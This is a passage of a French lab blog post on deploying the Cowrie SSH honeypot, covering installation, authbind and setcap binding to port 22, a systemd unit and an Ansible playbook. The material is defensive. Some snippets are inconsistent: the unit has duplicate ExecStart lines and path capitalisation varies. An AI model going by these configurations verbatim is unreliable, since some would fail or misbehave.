+<ol>
+<li>Installation des paquets requis :</li>
+</ol>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/02_hu7693ee61cc0dfb586d6ff07234dcd2f4_125097_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/02_hu7693ee61cc0dfb586d6ff07234dcd2f4_125097_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/02_hu7693ee61cc0dfb586d6ff07234dcd2f4_125097_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/02_hu7693ee61cc0dfb586d6ff07234dcd2f4_125097_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/02_hu7693ee61cc0dfb586d6ff07234dcd2f4_125097_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install git python3-virtualenv python3-dev libssl-dev libffi-dev build-essential -y
+</span></span></code></pre></div><ol start="2">
+<li>clonage du dépôt Cowrie :</li>
+</ol>
+<pre tabindex="0"><code>git clone https://github.com/Cowrie/Cowrie.git
+cd Cowrie
+</code></pre><ol start="3">
+<li>Création et activation d&rsquo;un environnement virtuel :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">virtualenv Cowrie-env
+</span></span><span class="line"><span class="cl"><span class="nb">source</span> Cowrie-env/bin/activate
+</span></span></code></pre></div><ol start="4">
+<li>Mise à jour et installation des dépendances Python:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pip install --upgrade pip
+</span></span><span class="line"><span class="cl">pip install -r requirements.txt
+</span></span></code></pre></div><p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/04_hu4ea4bb9b3b570fc5d48bfebd116a493a_52224_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/04_hu4ea4bb9b3b570fc5d48bfebd116a493a_52224_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/04_hu4ea4bb9b3b570fc5d48bfebd116a493a_52224_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/04_hu4ea4bb9b3b570fc5d48bfebd116a493a_52224_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/04_hu4ea4bb9b3b570fc5d48bfebd116a493a_52224_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p><strong>b) Configuration et démarrage</strong></p>
+<ol>
+<li>Copie et vérification du fichier de configuration :</li>
+</ol>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/05_huaf9082e84fe630cada82900b73c7e444_40189_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/05_huaf9082e84fe630cada82900b73c7e444_40189_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/05_huaf9082e84fe630cada82900b73c7e444_40189_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/05_huaf9082e84fe630cada82900b73c7e444_40189_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/05_huaf9082e84fe630cada82900b73c7e444_40189_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cp Cowrie.cfg.dist Cowrie.cfg
+</span></span><span class="line"><span class="cl">nano Cowrie.cfg
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>ssh<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Écoute sur le port 2222, toutes interfaces (0.0.0.0)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">listen_endpoints</span> <span class="o">=</span> tcp:2222:interface<span class="o">=</span>0.0.0.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Port que l&#39;attaquant &#34;voit&#34; (22 pour l&#39;illusion)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">guest_ssh_port</span> <span class="o">=</span> <span class="m">22</span>  <span class="c1">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>output_jsonlog<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">enabled</span> <span class="o">=</span> <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="nv">logfile</span> <span class="o">=</span> <span class="si">${</span><span class="nv">honeypot</span><span class="p">:</span><span class="nv">log_path</span><span class="si">}</span>/Cowrie.json
+</span></span><span class="line"><span class="cl"><span class="nv">epoch_timestamp</span> <span class="o">=</span> <span class="nb">false</span>
+</span></span></code></pre></div><ol start="2">
+<li>Scan de ports nmap et redirection de port</li>
+</ol>
+<p><strong><code>guest_ssh_port</code></strong>  est juste un <em>Leurre logiciel</em>* (pour l&rsquo;attaquant connecté). Lors d&rsquo;un scan  <code>nmap 192.168.243.130 -p 22,2222</code> dans l&rsquo;&rsquo;etat actuel, l&rsquo;attaquant verra:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; PORT     STATE  SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   closed ssh      <span class="c1"># Port 22 fermé (pas de redirection)</span>
+</span></span><span class="line"><span class="cl">2222/tcp open   ssh      <span class="c1"># Cowrie écoute ici, identifié comme SSH</span>
+</span></span></code></pre></div><p>Sans redirection <code>authbind</code>, seul le port <strong>2222</strong> est visible
+Nmap détecte un service SSH sur ce port. Tandis qu&rsquo;avec une redirection 22 → 2222 le résultat ressemblera à ça:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE  SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open   ssh      <span class="c1"># Redirection vers Cowrie (2222)</span>
+</span></span><span class="line"><span class="cl">2222/tcp open   ssh      
+</span></span></code></pre></div><p>Correspond donc mieux à notre vision et permettra aux attaquants ciblant le port 22 standard d&rsquo;être automatiquement dirigés vers le honeypot.</p>
+<ul>
+<li><strong>Étape 1 : Installation de authbind</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt install -y authbind
+</span></span></code></pre></div><ul>
+<li><strong>Étape 2 : Configuration de authbind pour le port 22</strong></li>
+</ul>
+<ol>
+<li>Création du  fichier de règle pour le port 22 :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo touch /etc/authbind/byport/22
+</span></span></code></pre></div><ol>
+<li>Définir les permissions pour l&rsquo;utilisateur <code>Cowrie</code> :</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo chown Cowrie:Cowrie /etc/authbind/byport/22
+</span></span><span class="line"><span class="cl">sudo chmod <span class="m">770</span> /etc/authbind/byport/22
+</span></span></code></pre></div><ul>
+<li><strong>Étape 3 : Modification de la configuration de Cowrie</strong></li>
+</ul>
+<p>Dans <code>Cowrie.cfg</code>, il faudra ajuster la section <code>[ssh]</code> pour écouter directement sur le port 22 :</p>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/09_autobind_huef3a5cdc7b7d07edb5866249301521f8_58453_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/09_autobind_huef3a5cdc7b7d07edb5866249301521f8_58453_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/09_autobind_huef3a5cdc7b7d07edb5866249301521f8_58453_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/09_autobind_huef3a5cdc7b7d07edb5866249301521f8_58453_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/09_autobind_huef3a5cdc7b7d07edb5866249301521f8_58453_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<blockquote>
+<p>À  cette étape on pourrait activer manuellement notre service avec la commande <code>bin/Cowrie start</code> mais celà est plus utile dans un cas où on voudrait faire un test rapide. En environnement de production ou dans un cas de projet comme le notre nous utiliseront systemd pour des raisons de fiabilité mais surtout de persistance et d&rsquo;intégration système.</p>
+</blockquote>
+<ul>
+<li><strong>Étape 4 : Création du fichier de service systemd</strong></li>
+</ul>
+<ol>
+<li>Création et configuration du fichier:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nano /etc/systemd/system/cowrie.service
+</span></span></code></pre></div><p>Nous utiliserons cette configuration:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>Unit<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Description</span><span class="o">=</span>A SSH and Telnet honeypot service
+</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>network.target
+</span></span><span class="line"><span class="cl"><span class="nv">After</span><span class="o">=</span>rsyslog.service
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Service<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">User</span><span class="o">=</span>Cowrie
+</span></span><span class="line"><span class="cl"><span class="nv">Group</span><span class="o">=</span>Cowrie
+</span></span><span class="line"><span class="cl"><span class="nv">Restart</span><span class="o">=</span>always
+</span></span><span class="line"><span class="cl"><span class="nv">RestartSec</span><span class="o">=</span><span class="m">5</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Environment</span><span class="o">=</span><span class="nv">PYTHONPATH</span><span class="o">=</span>/home/cowrie/cowrie/src
+</span></span><span class="line"><span class="cl"><span class="nv">WorkingDirectory</span><span class="o">=</span>/home/cowrie/cowrie
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/home/cowrie/cowrie/cowrie-env/bin/python /home/cowrie/cowrie/cowrie-env/bin/twistd --umask <span class="m">0022</span> --nodaemon --pidfile<span class="o">=</span> -l - cowrie
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">ExecStart</span><span class="o">=</span>/usr/bin/authbind --deep /home/cowrie/cowrie/cowrie-env/bin/python /home/cowrie/cowrie/cowrie-env/bin/twistd --umask <span class="m">0022</span> --nodaemon --pidfile<span class="o">=</span> -l - Cowrie
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">StandardOutput</span><span class="o">=</span>syslog
+</span></span><span class="line"><span class="cl"><span class="nv">StandardError</span><span class="o">=</span>syslog
+</span></span><span class="line"><span class="cl"><span class="nv">SyslogIdentifier</span><span class="o">=</span>Cowrie
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Install<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
+</span></span></code></pre></div><ol start="2">
+<li><strong>Rechargement de systemd et démarrage de Cowrie</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo systemctl daemon-reload 
+</span></span><span class="line"><span class="cl">sudo systemctl start cowrie
+</span></span></code></pre></div><ol start="3">
+<li>** Configuration</li>
+<li><strong>Activation du démarrage automatique (optionnel)</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> cowrie
+</span></span></code></pre></div><ol start="4">
+<li><strong>Vérification de l&rsquo;état du service</strong></li>
+</ol>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/08_statstus_cowrie_hu4e583fc1239eb05df5be5f934b964339_131372_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/08_statstus_cowrie_hu4e583fc1239eb05df5be5f934b964339_131372_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/08_statstus_cowrie_hu4e583fc1239eb05df5be5f934b964339_131372_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/08_statstus_cowrie_hu4e583fc1239eb05df5be5f934b964339_131372_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/08_statstus_cowrie_hu4e583fc1239eb05df5be5f934b964339_131372_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+<p>Le service comme on peut le voir est donc bien fonctionnel, mais il démarre toujours sur le port 2222. Suite à quelaues recherches sur l&rsquo;erreur on apprends que dans certains environnements, systemd peut ne pas transmettre l’environnement habituel à authbind.</p>
+<p>Une alternative consiste à utiliser la méthode des capacités Linux pour permettre à Python de binder sur un port privilégié sans être root. On peut utiliser:</p>
+<pre tabindex="0"><code>sudo setcap cap_net_bind_service=+ep $(readlink -f /home/Cowrie/Cowrie/Cowrie-env/bin/python)
+</code></pre><p>Depuis notre VM Caldera on a pu se connecter et confirmer que notre honeypot marche bien:</p>
+<blockquote>
+<p>Cowrie accepte <strong>n&rsquo;importe quel identifiant et mot de passe</strong> pour la connexion SSH, car son but est de piéger les attaquants et d&rsquo;enregistrer leurs tentatives.</p>
+</blockquote>
+<p>
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /posts/cyberlab-ii/img/10_connection_honeypot_hud281322eb2fc22dd56cc9603fa5b6d5f_104513_330x0_resize_box_3.png 330w,
+        /posts/cyberlab-ii/img/10_connection_honeypot_hud281322eb2fc22dd56cc9603fa5b6d5f_104513_660x0_resize_box_3.png 660w,
+        /posts/cyberlab-ii/img/10_connection_honeypot_hud281322eb2fc22dd56cc9603fa5b6d5f_104513_1024x0_resize_box_3.png 1024w,
+        /posts/cyberlab-ii/img/10_connection_honeypot_hud281322eb2fc22dd56cc9603fa5b6d5f_104513_1320x0_resize_box_3.png 2x"
+        src="/posts/cyberlab-ii/img/10_connection_honeypot_hud281322eb2fc22dd56cc9603fa5b6d5f_104513_660x0_resize_box_3.png"
+        alt=""
+      />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">3.3. Automatisation du déploiement avec Ansible 
+    <div id="33-automatisation-du-d%C3%A9ploiement-avec-ansible" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#33-automatisation-du-d%C3%A9ploiement-avec-ansible" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Notre playbook devra exécuter les tâches ci-après :</strong></p>
+<ul>
+<li>Installer les paquets essentiels</li>
+<li>Cloner le dépôt Git de Cowrie dans le répertoire approprié</li>
+<li>Créer un environnement virtuel dans le dossier de Cowrie</li>
+<li>Installer les dépendances Python listées dans le fichier <em>requirements.txt</em></li>
+<li>Copier le fichier de configuration d&rsquo;exemple pour initialiser la configuration</li>
+<li>Modifier la configuration pour que Cowrie écoute sur le port 22</li>
+<li>Déployer le service systemd pour démarrer automatiquement Cowrie</li>
+<li>Activer et démarrer le service Cowrie</li>
+</ul>
+<p>Dans notre dossier de playbooks, nous créons un fichier YAML nommé <code>deploy_cowrie.yml</code> qui contiendra l&rsquo;ensemble de ces tâches. Voici le contenu complet du playbook :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nn">---</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Déployer Cowrie avec authbind</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hosts</span><span class="p">:</span><span class="w"> </span><span class="l">cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">become</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">vars</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">cowrie_user</span><span class="p">:</span><span class="w"> </span><span class="l">cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">cowrie_dir</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;/home/{{ cowrie_user }}/Cowrie&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">cowrie_env</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_dir }}/Cowrie-env&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">tasks</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Créer l&#39;utilisateur cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">user</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_user }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">shell</span><span class="p">:</span><span class="w"> </span><span class="l">/bin/bash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">home</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;/home/{{ cowrie_user }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">create_home</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Installer les dépendances</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">apt</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">git</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">python3-virtualenv</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">python3-dev</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">libssl-dev</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">libffi-dev</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">build-essential</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span>- <span class="l">authbind</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">state</span><span class="p">:</span><span class="w"> </span><span class="l">present</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">update_cache</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Cloner Cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">git</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">repo</span><span class="p">:</span><span class="w"> </span><span class="l">https://github.com/cowrie/cowrie.git</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">dest</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_dir }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="l">main</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Créer l&#39;environnement virtuel</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;python3 -m venv {{ cowrie_env }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">args</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">chdir</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_dir }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">creates</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_env }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Installer les dépendances Python</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">pip</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">executable</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_env }}/bin/pip&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">requirements</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_dir }}/requirements.txt&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Configurer authbind pour le port 22</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">file</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/etc/authbind/byport/22</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">state</span><span class="p">:</span><span class="w"> </span><span class="l">touch</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0770&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">owner</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_user }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">group</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_user }}&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Copier le fichier de configuration cowrie.cfg</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">copy</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">src</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_dir }}/etc/cowrie.cfg.dist&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">dest</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_dir }}/etc/cowrie.cfg&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">remote_src</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">notify</span><span class="p">:</span><span class="w"> </span><span class="l">Redémarrer Cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Modifier le port d&#39;écoute dans cowrie.cfg</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">replace</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;{{ cowrie_dir }}/etc/cowrie.cfg&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">regexp</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;^#?listen_endpoints = .*&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">replace</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;listen_endpoints = tcp:22:interface=0.0.0.0&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">notify</span><span class="p">:</span><span class="w"> </span><span class="l">Redémarrer Cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Déployer le service systemd pour Cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">copy</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">dest</span><span class="p">:</span><span class="w"> </span><span class="l">/etc/systemd/system/cowrie.service</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">content</span><span class="p">:</span><span class="w"> </span><span class="p">|</span><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">          [Unit]
+</span></span></span><span class="line"><span class="cl"><span class="sd">          Description=Cowrie SSH Honeypot
+</span></span></span><span class="line"><span class="cl"><span class="sd">          After=network.target
+</span></span></span><span class="line"><span class="cl"><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">          [Service]
+</span></span></span><span class="line"><span class="cl"><span class="sd">          User={{ cowrie_user }}
+</span></span></span><span class="line"><span class="cl"><span class="sd">          Group={{ cowrie_user }}
+</span></span></span><span class="line"><span class="cl"><span class="sd">          WorkingDirectory={{ cowrie_dir }}
+</span></span></span><span class="line"><span class="cl"><span class="sd">          ExecStart=/usr/bin/authbind --deep {{ cowrie_env }}/bin/python {{ cowrie_dir }}/bin/cowrie start --nodaemon
+</span></span></span><span class="line"><span class="cl"><span class="sd">          Restart=always
+</span></span></span><span class="line"><span class="cl"><span class="sd">          RestartSec=5s
+</span></span></span><span class="line"><span class="cl"><span class="sd">
+</span></span></span><span class="line"><span class="cl"><span class="sd">          [Install]
+</span></span></span><span class="line"><span class="cl"><span class="sd">          WantedBy=multi-user.target</span><span class="w">          
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">notify</span><span class="p">:</span><span class="w"> </span><span class="l">Redémarrer Cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Activer et démarrer le service Cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">systemd</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">state</span><span class="p">:</span><span class="w"> </span><span class="l">started</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">enabled</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">daemon_reload</span><span class="p">:</span><span class="w"> </span><span class="kc">yes</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">handlers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Redémarrer Cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">systemd</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">cowrie</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">state</span><span class="p">:</span><span class="w"> </span><span class="l">restarted</span><span class="w">
+</span></span></span></code></pre></div><p>On éxécute ensuite notre playbook avec la commande:</p>
